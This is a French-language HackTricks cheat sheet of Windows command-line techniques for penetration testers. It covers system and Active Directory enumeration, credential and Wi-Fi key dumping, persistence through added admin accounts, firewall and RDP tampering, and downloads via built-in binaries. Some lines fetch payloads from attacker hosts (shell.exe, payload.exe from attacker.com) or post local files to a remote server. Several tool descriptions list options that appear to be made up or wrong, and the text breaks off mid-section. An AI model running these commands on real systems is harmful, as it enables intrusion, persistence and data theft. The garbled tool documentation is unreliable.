# CMD de base pour les Pentesters Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations syst√®me

### Informations sur la version et les correctifs
```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```
### Environnement
```bash
set #List all environment variables
```
Quelques variables d'environnement √† souligner :

* **COMPUTERNAME** : Nom de l'ordinateur
* **TEMP/TMP** : Dossier temporaire
* **USERNAME** : Votre nom d'utilisateur
* **HOMEPATH/USERPROFILE** : R√©pertoire personnel
* **windir** : C:\Windows
* **OS** : Syst√®me d'exploitation Windows
* **LOGONSERVER** : Nom du contr√¥leur de domaine
* **USERDNSDOMAIN** : Nom de domaine √† utiliser avec DNS
* **USERDOMAIN** : Nom du domaine
```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```
### Disques mont√©s
```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```
### [D√©fenseur](authentication-credentials-uac-and-efs.md#defender)

### Corbeille
```bash
dir C:\$Recycle.Bin /s /b
```
### Processus, Services & Logiciels

---

#### Processes

#### Processus

---

##### List running processes

##### Liste des processus en cours d'ex√©cution

```
tasklist
```

---

##### List running processes with more details

##### Liste des processus en cours d'ex√©cution avec plus de d√©tails

```
tasklist /v
```

---

##### Kill a process by name

##### Tuer un processus par son nom

```
taskkill /IM <process_name>.exe /F
```

---

##### Kill a process by PID

##### Tuer un processus par son PID

```
taskkill /PID <process_PID> /F
```

---

#### Services

#### Services

---

##### List running services

##### Liste des services en cours d'ex√©cution

```
net start
```

---

##### List all services

##### Liste de tous les services

```
sc query
```

---

##### List all services with more details

##### Liste de tous les services avec plus de d√©tails

```
sc queryex type=service
```

---

##### Stop a service

##### Arr√™ter un service

```
net stop <service_name>
```

---

##### Start a service

##### D√©marrer un service

```
net start <service_name>
```

---

##### Restart a service

##### Red√©marrer un service

```
net stop <service_name> && net start <service_name>
```

---

#### Software

#### Logiciels

---

##### List installed software

##### Liste des logiciels install√©s

```
wmic product get name
```

---

##### List installed software with more details

##### Liste des logiciels install√©s avec plus de d√©tails

```
wmic product get name,version,vendor
```
```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```
## Informations de domaine
```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #¬†Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
### Journaux et √©v√©nements
```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```
## Utilisateurs et groupes

### Utilisateurs
```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```
### Groupes
```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```
### Liste des sessions

Pour lister les sessions actives sur une machine Windows, vous pouvez utiliser la commande suivante :

```cmd
query session
```

Cette commande affichera une liste des sessions actives avec leur ID de session, leur √©tat, le nom de l'utilisateur et le type de session.
```
qwinsta
klist sessions
```
### Politique de mot de passe
```
net accounts
```
### Identifiants
```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```
### Persistence avec les utilisateurs
```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```
## R√©seau

### Interfaces, Routes, Ports, H√¥tes et DNSCache
```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```
### Pare-feu
```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop" 

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add ‚ÄúHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server‚Äù /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```
### Partages
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Wifi
```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```
### SNMP

Le protocole SNMP (Simple Network Management Protocol) est utilis√© pour g√©rer et surveiller les √©quipements r√©seau tels que les routeurs, les commutateurs et les serveurs. Il permet aux administrateurs r√©seau de collecter des informations sur les performances et l'√©tat des √©quipements r√©seau, ainsi que de configurer ces √©quipements √† distance.

Les outils de gestion SNMP tels que snmpwalk et snmpget peuvent √™tre utilis√©s pour interroger les √©quipements r√©seau et r√©cup√©rer des informations telles que les adresses IP, les noms d'h√¥tes, les adresses MAC et les informations de routage. Cependant, il est important de noter que SNMP peut √©galement √™tre utilis√© pour collecter des informations sensibles telles que les mots de passe et les cl√©s de chiffrement.

Les attaquants peuvent utiliser des outils tels que SNMP brute-forcing pour deviner les mots de passe SNMP et acc√©der aux informations sensibles stock√©es sur les √©quipements r√©seau. Il est donc important de configurer correctement les param√®tres de s√©curit√© SNMP, tels que les cha√Ænes de communaut√© SNMP et les autorisations d'acc√®s, pour √©viter les fuites d'informations sensibles.
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```
### Interfaces R√©seau
```bash
ipconfig /all
```
### Table ARP

La table ARP (Address Resolution Protocol) est utilis√©e pour mapper les adresses IP aux adresses MAC. Elle stocke les informations sur les adresses MAC des p√©riph√©riques connect√©s au r√©seau local. Pour afficher la table ARP, utilisez la commande suivante : 

```
arp -a
```
```bash
arp -A
```
## T√©l√©chargement

Bitsadmin.exe
```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
# CertReq.exe

CertReq.exe est un outil en ligne de commande qui permet de soumettre des demandes de certificat √† une autorit√© de certification (CA). Il est inclus dans les syst√®mes d'exploitation Windows et peut √™tre utilis√© pour cr√©er et g√©rer des certificats.

## Syntaxe

```
certreq -new <NomFichier>.inf <NomFichier>.cer
```

## Exemple

```
certreq -new certificat.inf certificat.cer
```

Dans cet exemple, CertReq.exe utilise le fichier d'informations "certificat.inf" pour cr√©er une demande de certificat. Une fois la demande soumise √† l'autorit√© de certification, le certificat sera g√©n√©r√© et stock√© dans le fichier "certificat.cer".
```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```
# Certutil.exe

Certutil.exe est un outil en ligne de commande qui est install√© par d√©faut sur les syst√®mes d'exploitation Windows. Il est principalement utilis√© pour g√©rer les certificats num√©riques et les services de certification. Cependant, il peut √©galement √™tre utilis√© pour effectuer des t√¢ches de base en tant que pentester.

## V√©rification de la signature num√©rique

Certutil.exe peut √™tre utilis√© pour v√©rifier la signature num√©rique d'un fichier. Cela peut √™tre utile pour d√©terminer si un fichier a √©t√© modifi√© ou s'il est authentique.

```cmd
certutil -hashfile <nom du fichier> <algorithme de hachage>
certutil -verify <nom du fichier>
```

## Conversion de certificats

Certutil.exe peut √™tre utilis√© pour convertir des certificats d'un format √† un autre.

```cmd
certutil -encode <nom du fichier d'entr√©e> <nom du fichier de sortie>
certutil -decode <nom du fichier d'entr√©e> <nom du fichier de sortie>
```

## Affichage des informations de certificat

Certutil.exe peut √™tre utilis√© pour afficher les informations d'un certificat.

```cmd
certutil -dump <nom du fichier de certificat>
```

## T√©l√©chargement de certificats

Certutil.exe peut √™tre utilis√© pour t√©l√©charger des certificats √† partir d'un serveur.

```cmd
certutil -urlcache -split -f <URL du certificat> <nom du fichier de sortie>
```

## V√©rification de la r√©vocation de certificat

Certutil.exe peut √™tre utilis√© pour v√©rifier si un certificat a √©t√© r√©voqu√©.

```cmd
certutil -url <URL de la liste de r√©vocation de certificat>
```

## V√©rification de la cha√Æne de certificats

Certutil.exe peut √™tre utilis√© pour v√©rifier la cha√Æne de certificats.

```cmd
certutil -verify -urlfetch <nom du fichier de certificat>
```
```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```
Desktopimgdownldr.exe
```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```
Diantz.exe est un outil de compression de fichiers qui peut √™tre utilis√© pour compresser et d√©compresser des fichiers. Il est souvent utilis√© par les attaquants pour compresser des fichiers malveillants afin de les rendre plus difficiles √† d√©tecter par les logiciels antivirus. Les pentesteurs peuvent √©galement utiliser Diantz.exe pour compresser des fichiers de donn√©es sensibles avant de les transf√©rer sur un r√©seau non s√©curis√©.
```
diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
```
# Esentutl.exe

`Esentutl.exe` est un outil de ligne de commande qui permet de g√©rer les bases de donn√©es Jet Blue (`.edb`). Il est utilis√© pour effectuer des t√¢ches telles que la r√©cup√©ration de donn√©es, la r√©paration de fichiers corrompus et la v√©rification de l'int√©grit√© des fichiers.

## Syntaxe

```
esentutl.exe <command> <options>
```

## Commandes

- `/r` - R√©cup√®re une base de donn√©es √† partir d'un fichier journal.
- `/p` - R√©pare une base de donn√©es corrompue.
- `/g` - V√©rifie l'int√©grit√© d'une base de donn√©es.
- `/d` - D√©fragmente une base de donn√©es.
- `/cc` - Cr√©e une copie de s√©curit√© de la base de donn√©es.
- `/mm` - Affiche des informations sur la m√©moire utilis√©e par la base de donn√©es.
- `/vss` - Cr√©e une copie de s√©curit√© de la base de donn√©es en utilisant le service de clich√© instantan√© de volume (VSS).

## Options courantes

- `/s <path>` - Sp√©cifie le chemin d'acc√®s √† la base de donn√©es.
- `/o` - √âcrase la base de donn√©es existante lors de la r√©cup√©ration.
- `/i` - Ignore les erreurs de v√©rification de l'int√©grit√© de la base de donn√©es.
- `/t` - Affiche des informations de d√©bogage suppl√©mentaires.

## Exemples

### R√©cup√©rer une base de donn√©es √† partir d'un fichier journal

```
esentutl.exe /r edb.log /l "C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database 1" /d "C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database 1"
```

### R√©parer une base de donn√©es corrompue

```
esentutl.exe /p "C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database 1\Mailbox Database 1.edb"
```

### V√©rifier l'int√©grit√© d'une base de donn√©es

```
esentutl.exe /g "C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database 1\Mailbox Database 1.edb"
```
```
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
```
# Expand.exe

`Expand.exe` est un outil de ligne de commande qui permet de d√©compresser des fichiers compress√©s dans des archives Microsoft Cabinet (.cab). Il est g√©n√©ralement utilis√© pour extraire des fichiers syst√®me √† partir de fichiers d'installation Windows.

## Syntaxe

```
expand.exe [-r] source [destination]
```

## Options

- `-r` : permet de d√©compresser r√©cursivement tous les fichiers dans le r√©pertoire source et ses sous-r√©pertoires.

## Exemples

- Extraire tous les fichiers d'une archive `.cab` :

```
expand.exe source.cab
```

- Extraire tous les fichiers d'une archive `.cab` dans un r√©pertoire sp√©cifique :

```
expand.exe source.cab -d C:\destination
```

- Extraire tous les fichiers d'une archive `.cab` r√©cursivement :

```
expand.exe -r source.cab
```

- Extraire tous les fichiers d'une archive `.cab` r√©cursivement dans un r√©pertoire sp√©cifique :

```
expand.exe -r source.cab -d C:\destination
```
```
expand \\webdav\folder\file.bat c:\ADS\file.bat
```
Extrac32.exe est un outil de ligne de commande qui permet d'extraire des fichiers √† partir de fichiers .cab. Il est disponible sur les syst√®mes d'exploitation Windows.
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```
# Findstr.exe

`findstr` est une commande de recherche de cha√Ænes de caract√®res dans des fichiers ou des cha√Ænes de caract√®res. Elle est tr√®s utile pour la recherche de mots de passe, de noms d'utilisateurs et d'autres informations sensibles dans les fichiers syst√®me.

## Syntaxe

```
findstr [/b] [/e] [/l] [/r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f: FichierTexte] [/c: Cha√Æne] [/g: FichierTexte] [Cha√Æne [Fichier [Fichier] ...]]
```

## Options

- `/b` : Recherche les cha√Ænes de caract√®res qui commencent par la cha√Æne sp√©cifi√©e.
- `/e` : Recherche les cha√Ænes de caract√®res qui se terminent par la cha√Æne sp√©cifi√©e.
- `/l` : Recherche les cha√Ænes de caract√®res qui correspondent exactement √† la cha√Æne sp√©cifi√©e.
- `/r` : Recherche les cha√Ænes de caract√®res qui correspondent √† une expression r√©guli√®re.
- `/s` : Recherche les cha√Ænes de caract√®res dans les sous-r√©pertoires.
- `/i` : Recherche les cha√Ænes de caract√®res sans tenir compte de la casse.
- `/x` : Recherche les cha√Ænes de caract√®res qui correspondent exactement √† la cha√Æne sp√©cifi√©e, y compris les espaces.
- `/v` : Recherche les cha√Ænes de caract√®res qui ne correspondent pas √† la cha√Æne sp√©cifi√©e.
- `/n` : Affiche le num√©ro de ligne de chaque occurrence trouv√©e.
- `/m` : Affiche seulement les noms des fichiers contenant des occurrences.
- `/o` : Affiche le d√©calage de chaque occurrence trouv√©e.
- `/p` : Skip files with non-printable characters.
- `/f: FichierTexte` : Sp√©cifie un fichier contenant une liste de cha√Ænes de caract√®res √† rechercher.
- `/c: Cha√Æne` : Sp√©cifie la cha√Æne de caract√®res √† rechercher.
- `/g: FichierTexte` : Sp√©cifie un fichier contenant une liste de fichiers √† rechercher.

## Exemples

- `findstr /s /i /n /p password *.txt` : Recherche le mot de passe dans tous les fichiers texte du r√©pertoire actuel et de ses sous-r√©pertoires, sans tenir compte de la casse, en affichant le num√©ro de ligne et en sautant les fichiers avec des caract√®res non imprimables.
- `findstr /s /i /n /p /m /c:"password" *` : Recherche le mot de passe dans tous les fichiers du r√©pertoire actuel et de ses sous-r√©pertoires, sans tenir compte de la casse, en affichant le num√©ro de ligne et en sautant les fichiers avec des caract√®res non imprimables, et en affichant seulement les noms des fichiers contenant des occurrences.
- `findstr /s /i /n /p /m /f:liste.txt *` : Recherche toutes les cha√Ænes de caract√®res contenues dans le fichier `liste.txt` dans tous les fichiers du r√©pertoire actuel et de ses sous-r√©pertoires, sans tenir compte de la casse, en affichant le num√©ro de ligne et en sautant les fichiers avec des caract√®res non imprimables, et en affichant seulement les noms des fichiers contenant des occurrences.
```
findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
```
# Ftp.exe

`ftp.exe` est un client FTP en ligne de commande qui est inclus dans les syst√®mes d'exploitation Windows. Il peut √™tre utilis√© pour se connecter √† un serveur FTP et transf√©rer des fichiers.

## Syntaxe

```
ftp [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [-b:asyncbuffers] [-w:windowsize] [host]
```

## Options

- `-v` : Mode verbeux. Affiche toutes les r√©ponses du serveur FTP.
- `-d` : Mode d√©bogage. Affiche des informations suppl√©mentaires pour le d√©bogage.
- `-i` : Mode non interactif. D√©sactive les demandes de confirmation pour les commandes.
- `-n` : D√©sactive l'auto-login. Utilis√© pour sp√©cifier un nom d'utilisateur et un mot de passe lors de la connexion.
- `-g` : D√©sactive la prise en charge du fichier de hachage g√©n√©r√© par le serveur FTP.
- `-s:filename` : Sp√©cifie un fichier contenant des commandes FTP √† ex√©cuter.
- `-a` : Utilise le mode ASCII pour transf√©rer les fichiers.
- `-A` : Utilise le mode binaire pour transf√©rer les fichiers.
- `-x:sendbuffer` : Sp√©cifie la taille du tampon d'envoi.
- `-r:recvbuffer` : Sp√©cifie la taille du tampon de r√©ception.
- `-b:asyncbuffers` : Sp√©cifie le nombre de tampons asynchrones √† utiliser.
- `-w:windowsize` : Sp√©cifie la taille de la fen√™tre de transfert.

## Exemples

- Se connecter √† un serveur FTP :

```
ftp ftp.example.com
```

- Se connecter √† un serveur FTP avec un nom d'utilisateur et un mot de passe :

```
ftp -n ftp.example.com
User: username
Password: password
```

- T√©l√©charger un fichier :

```
ftp> get filename
```

- T√©l√©charger un r√©pertoire :

```
ftp> mget *
```

- T√©l√©charger un r√©pertoire et ses sous-r√©pertoires :

```
ftp> mget * -s
```

- T√©l√©charger un fichier en mode binaire :

```
ftp> binary
ftp> get filename
```

- T√©l√©charger un fichier en mode ASCII :

```
ftp> ascii
ftp> get filename
```

- T√©l√©charger un fichier en utilisant un proxy :

```
ftp -v -d -i -n -g -s:filename -a -A -x:sendbuffer -r:recvbuffer -b:asyncbuffers -w:windowsize -e:proxy ftp.example.com
```
```
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```
GfxDownloadWrapper.exe
```
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```
Hh.exe

Hh.exe is a Microsoft HTML Help executable that is used to display compiled help files (.chm) on Windows systems. It can also be used to execute arbitrary commands on the system.

Hh.exe est un ex√©cutable Microsoft HTML Help qui est utilis√© pour afficher des fichiers d'aide compil√©s (.chm) sur les syst√®mes Windows. Il peut √©galement √™tre utilis√© pour ex√©cuter des commandes arbitraires sur le syst√®me.
```
HH.exe http://some.url/script.ps1
```
# ieexec.exe

ieexec.exe is a binary that can be used to execute Internet Explorer with a specific URL. This can be useful for bypassing application whitelisting or executing code on a target machine.

## Usage

```
ieexec.exe <URL>
```

## Example

```
ieexec.exe http://example.com
```

This will open Internet Explorer and navigate to http://example.com.
```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```
# Makecab.exe

`Makecab.exe` est un outil de compression de fichiers int√©gr√© √† Windows. Il est souvent utilis√© pour compresser des fichiers dans des archives CAB. Les archives CAB sont souvent utilis√©es pour distribuer des mises √† jour logicielles et des pilotes.

## Syntaxe

```
makecab [/V[n]] [/D var=value ...] [/L dir] source [destination]
```

## Options

- `/V[n]` : D√©finit le niveau de verbosit√©. Plus `n` est grand, plus le niveau de d√©tail est √©lev√©.
- `/D var=value` : D√©finit une variable d'environnement pour le processus de compression.
- `/L dir` : D√©finit le r√©pertoire de destination pour les fichiers de journalisation.
- `source` : Sp√©cifie le fichier ou le r√©pertoire source √† compresser.
- `destination` : Sp√©cifie le nom et le chemin de l'archive CAB √† cr√©er. Si cette option n'est pas sp√©cifi√©e, `makecab.exe` utilise le nom du fichier source avec l'extension `.cab`.

## Exemples

- Pour compresser un fichier nomm√© `file.txt` dans une archive CAB nomm√©e `file.cab` :

```
makecab file.txt file.cab
```

- Pour compresser tous les fichiers dans un r√©pertoire nomm√© `folder` dans une archive CAB nomm√©e `folder.cab` :

```
makecab folder folder.cab
```

- Pour compresser tous les fichiers dans un r√©pertoire nomm√© `folder` dans une archive CAB nomm√©e `archive.cab` et enregistrer les fichiers de journalisation dans un r√©pertoire nomm√© `logs` :

```
makecab /L logs folder archive.cab
```
```
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
```
# MpCmdRun.exe

MpCmdRun.exe est l'ex√©cutable de ligne de commande de Windows Defender. Il peut √™tre utilis√© pour effectuer des analyses √† la demande, mettre √† jour les d√©finitions de virus et effectuer d'autres t√¢ches de gestion de Windows Defender.

## Syntaxe

```
MpCmdRun.exe [commande] [-options]
```

## Commandes

- **-SignatureUpdate** : Met √† jour les d√©finitions de virus.
- **-Scan** : Effectue une analyse √† la demande.
- **-Trace** : Active la journalisation des √©v√©nements de Windows Defender.
- **-GetFiles** : R√©cup√®re des fichiers suspects pour analyse.
- **-RemoveDefinitions** : Supprime toutes les d√©finitions de virus existantes.

## Options

- **-ScanType** : Type d'analyse √† effectuer. Les options sont : 0 (analyse rapide), 1 (analyse compl√®te) et 2 (analyse personnalis√©e).
- **-File** : Analyse un fichier sp√©cifique.
- **-DisableRemediation** : D√©sactive la suppression automatique des fichiers infect√©s.
- **-Timeout** : Temps d'attente en secondes pour l'analyse.
- **-FullScan** : Effectue une analyse compl√®te.
- **-BootSectorScan** : Effectue une analyse du secteur de d√©marrage.
- **-ScanArchives** : Analyse les archives.
- **-TraceLevel** : Niveau de journalisation. Les options sont : 0 (d√©sactiv√©), 1 (informations), 2 (avertissements) et 3 (erreurs).
- **-TraceFormat** : Format de journalisation. Les options sont : 0 (XML) et 1 (CSV).
- **-TraceMaxFileSize** : Taille maximale du fichier journal en m√©gaoctets.
- **-GetFilesPath** : Chemin du dossier contenant les fichiers suspects.
- **-RemoveAll** : Supprime toutes les d√©finitions de virus existantes.
- **-Remove** : Supprime une d√©finition de virus sp√©cifique.

## Exemples

- Mettre √† jour les d√©finitions de virus :

```
MpCmdRun.exe -SignatureUpdate
```

- Effectuer une analyse rapide :

```
MpCmdRun.exe -Scan -ScanType 0
```

- Analyser un fichier sp√©cifique :

```
MpCmdRun.exe -Scan -File "C:\monfichier.exe"
```

- D√©sactiver la suppression automatique des fichiers infect√©s :

```
MpCmdRun.exe -Scan -DisableRemediation
```

- Activer la journalisation des √©v√©nements de Windows Defender :

```
MpCmdRun.exe -Trace -TraceLevel 1 -TraceFormat 0 -TraceMaxFileSize 10
```

- R√©cup√©rer des fichiers suspects pour analyse :

```
MpCmdRun.exe -GetFiles -GetFilesPath "C:\mon_dossier_suspect"
```

- Supprimer toutes les d√©finitions de virus existantes :

```
MpCmdRun.exe -RemoveDefinitions -RemoveAll
```
```
MpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable
```
# Replace.exe

`Replace.exe` est un outil de ligne de commande qui permet de remplacer des fichiers. Il est souvent utilis√© pour remplacer des fichiers syst√®me par des fichiers malveillants.

## Syntaxe

```
replace.exe <fichier_original> <fichier_de_remplacement> <fichier_de_sauvegarde>
```

- `<fichier_original>` : le chemin d'acc√®s complet du fichier original que vous souhaitez remplacer.
- `<fichier_de_remplacement>` : le chemin d'acc√®s complet du fichier de remplacement que vous souhaitez utiliser.
- `<fichier_de_sauvegarde>` : le chemin d'acc√®s complet du fichier de sauvegarde que vous souhaitez cr√©er.

## Exemple

```
replace.exe C:\Windows\System32\calc.exe C:\Malware\calc.exe C:\Windows\System32\calc.exe.bak
```

Cet exemple remplace le fichier `calc.exe` dans le r√©pertoire `C:\Windows\System32` par le fichier `calc.exe` malveillant situ√© dans le r√©pertoire `C:\Malware`. Le fichier original est sauvegard√© sous le nom `calc.exe.bak`.
```
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
```
Excel.exe est l'ex√©cutable du logiciel Microsoft Excel, qui est un tableur utilis√© pour effectuer des calculs et des analyses de donn√©es.
```
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
```
Powerpnt.exe est l'ex√©cutable de Microsoft PowerPoint, un logiciel de pr√©sentation largement utilis√© pour cr√©er des diaporamas professionnels.
```
